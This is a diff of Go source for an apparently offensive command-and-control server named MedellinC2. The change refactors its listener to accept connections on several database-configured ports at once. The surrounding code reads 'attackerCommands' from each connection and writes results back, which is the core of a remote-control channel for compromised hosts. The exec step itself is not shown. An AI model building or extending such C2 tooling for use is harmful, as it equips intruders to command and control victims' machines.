@@ -12,6 +12,7 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/megatop1/MedellinC2/data"
 	"github.com/spf13/cobra"
@@ -65,11 +66,42 @@ func listenForConnections() {
 	println(logo)
 	println("Medlelin C2 Server Successfully Started...")
 	println("The open ports are: " + data.GetListenerPorts())
-	checkListenerPorts()
-	print("the length of checkListenerPorts is :")
+	print("the length of checkListenerPorts is ")
 	fmt.Println(len(checkListenerPorts()))
 
-	l, err := net.Listen("tcp4", ":8080")
+	/* //handlePorts()
+	var numOfPorts = len(checkListenerPorts())
+	println("number of ports ", numOfPorts)
+
+	for i := range checkListenerPorts() {
+		//fmt.Println(i, element)
+		println(checkListenerPorts()[i])
+		handlePorts(checkListenerPorts()[i])
+	}
+
+	/* for i := 0; i <= numOfPorts; i++ {
+		//print the index of the port array
+		print(checkListenerPorts())
+		//handlePorts(strconv.Itoa(i))
+	} */
+
+	//Allows us to listen over multiple ports
+	for _, port := range checkListenerPorts() { //When you don't really care about the index use _,
+		go handlePorts(port)
+	}
+	time.Sleep(time.Second * 30)
+
+}
+
+//Function to parse listener's ports for active listeners in the database.
+func checkListenerPorts() []string {
+	//use the strings.Split function to split a string into its comma separated values
+	return strings.Split(data.GetListenerPorts(), ",")
+	//fmt.Println(portList)
+}
+
+func handlePorts(port string) {
+	l, err := net.Listen("tcp4", ":"+port)
 
 	if err != nil {
 		fmt.Println(err)
@@ -84,7 +116,7 @@ func listenForConnections() {
 			return
 		}
 		go handleConnection(connection)
-		count++
+		//count++
 
 		for {
 			attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
@@ -97,13 +129,4 @@ func listenForConnections() {
 			connection.Write(out)
 		}
 	}
-
-}
-
-//Function to parse listener's ports for active listeners in the database.
-func checkListenerPorts() []string {
-	//use the strings.Split function to split a string into its comma separated values
-	portList := strings.Split(data.GetListenerPorts(), ",")
-	return portList
-	//fmt.Println(portList)
 }
